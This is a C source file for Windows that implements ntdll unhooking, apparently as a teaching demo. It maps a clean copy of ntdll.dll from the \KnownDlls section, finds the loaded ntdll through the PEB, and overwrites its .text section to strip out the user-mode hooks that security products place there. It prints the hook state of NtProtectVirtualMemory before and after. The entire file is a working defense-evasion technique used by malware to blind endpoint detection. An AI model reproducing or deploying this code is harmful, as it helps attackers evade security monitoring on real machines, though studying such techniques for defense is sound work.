#include<Windows.h>
#include<stdio.h>
#include<winternl.h>

#define NTDLL L"\\KnownDlls\\ntdll.dll"


typedef NTSTATUS(NTAPI* fnNtOpenSection)(
	PHANDLE					SectionHandle,
	ACCESS_MASK				DesiredAccess,
	POBJECT_ATTRIBUTES		ObjectAttributes
	);

BOOL MapNtdllFromKnownDlls(OUT PVOID* ppUnhookedNtdll) {

	NTSTATUS STATUS = TRUE;
	HANDLE hSection = NULL;
	UNICODE_STRING UniStr;
	OBJECT_ATTRIBUTES ObjAttr;
	PVOID pNtdllBuf = NULL;

	UniStr.Buffer = NTDLL;
	UniStr.Length = wcslen(NTDLL) * sizeof(WCHAR);
	UniStr.MaximumLength = UniStr.Length + sizeof(WCHAR);

	InitializeObjectAttributes(&ObjAttr,&UniStr,OBJ_CASE_INSENSITIVE , NULL, NULL);

	// getting NtOpenSection address

	fnNtOpenSection pNtOpenSection = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenSection");

	STATUS = pNtOpenSection(&hSection, SECTION_MAP_READ, &ObjAttr);
	if(STATUS != 0){
		printf("NtOpenSection failed with status: 0x%X\n", STATUS);
		goto _EndOfFunction;
	}

	// mapping the section
	pNtdllBuf = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
	if(pNtdllBuf == NULL){
		printf("MapViewOfFile failed with error: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	*ppUnhookedNtdll = pNtdllBuf;

_EndOfFunction:
	if (hSection)
		CloseHandle(hSection);
	if (*ppUnhookedNtdll == NULL)
		return FALSE;
	else
		return TRUE;

}


PVOID FetchLocalNtdllBaseAddress() {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	return pLdr->DllBase;
}


BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

	PVOID				pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();

	printf("\t[i] 'Hooked' Ntdll Base Address : 0x%p \n\t[i] 'Unhooked' Ntdll Base Address : 0x%p \n", pLocalNtdll, pUnhookedNtdll);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	// getting the dos header
	PIMAGE_DOS_HEADER	pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// getting the nt headers
	PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt = NULL,	// local hooked text section base address
		pRemoteNtdllTxt = NULL; // the unhooked text section base address
	SIZE_T		sNtdllTxtSize = NULL;	// the size of the text section



	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
			pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
			sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

	//---------------------------------------------------------------------------------------------------------------------------

	printf("\t[i] 'Hooked' Ntdll Text Section Address : 0x%p \n\t[i] 'Unhooked' Ntdll Text Section Address : 0x%p \n\t[i] Text Section Size : %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
		return FALSE;

	//---------------------------------------------------------------------------------------------------------------------------

	printf("[i] Replacing The Text Section ... ");
	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// copying the new text section 
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	// rrestoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE !\n");

	return TRUE;
}


VOID PrintState(char* cSyscallName, PVOID pSyscallAddress) {
	printf("[#] %s [ 0x%p ] ---> %s \n", cSyscallName, pSyscallAddress, (*(ULONG*)pSyscallAddress != 0xb8d18b4c) == TRUE ? "[ HOOKED ]" : "[ UNHOOKED ]");
}

int main() {
	PVOID pNtdll = NULL;

	PrintState("NtProtectVirtualMemory", GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtProtectVirtualMemory"));

	printf("[i] Mapping Ntdll From KnownDlls ... \n");
	if (!MapNtdllFromKnownDlls(&pNtdll)) {
		printf("[!] Failed To Map Ntdll From KnownDlls \n");
		return -1;
	}

	printf("[+] Ntdll Mapped From KnownDlls Successfully ! \n");
	printf("[i] Replacing The Text Section ... \n");
	if (!ReplaceNtdllTxtSection(pNtdll)) {
		printf("[!] Failed To Replace The Text Section \n");
		return -1;
	}

	UnmapViewOfFile(pNtdll);

	printf("[+] Text Section Replaced Successfully ! \n");

	PrintState("NtProtectVirtualMemory", GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtProtectVirtualMemory"));

	printf("[#] Press <Enter> To Exit ... ");
	getchar();
	return 0;
}